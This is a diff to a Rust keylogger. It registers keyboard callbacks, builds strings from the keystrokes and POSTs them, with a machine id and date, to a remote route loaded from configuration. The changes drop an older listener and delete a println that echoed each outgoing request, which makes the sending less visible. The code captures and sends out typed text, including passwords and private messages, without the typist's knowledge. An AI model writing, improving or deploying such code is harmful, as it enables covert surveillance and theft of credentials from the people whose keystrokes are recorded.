@@ -1,5 +1,5 @@
 use std::sync::{Arc, Mutex};
-use device_query::{DeviceEvents};
+use device_query::DeviceEvents;
 use device_query::Keycode;
 pub use device_query::device_events::KeyboardCallback;
 use device_query::{DeviceState, keymap};
@@ -21,7 +21,7 @@ pub fn cat(){
 }
 
 fn listen2(device_state: DeviceState) -> CallbackGuard<impl Fn(&Keycode)>{
-    let mut cache = Arc::new(Mutex::new(String::new())); 
+    let cache = Arc::new(Mutex::new(String::new())); 
     let cache_clone = Arc::clone(&cache);
 
 
@@ -38,25 +38,12 @@ fn listen2(device_state: DeviceState) -> CallbackGuard<impl Fn(&Keycode)>{
     )
 }
 
-fn listen(device_state:DeviceState) -> CallbackGuard<impl Fn(&Keycode)>{
-
-    device_state.on_key_down(|keys| {
-
-        let mut cache: String = String::new();
-        let chars = keycode_to_string(*keys); 
-        cache.push_str(chars); 
-        send(cache); 
-        }
-    )
-}
-
 fn send(chars: String) {
 
     let route = load_route();
     let id = get_id();
     let date = get_date();
     let req = format!("{}/?id={}&date={}&text={}", route, id, date, chars);
-    println!("{}", req);
     let client = Client::new();
     let r = client.post(req).build().unwrap();
     let _ = client.execute(r).unwrap();
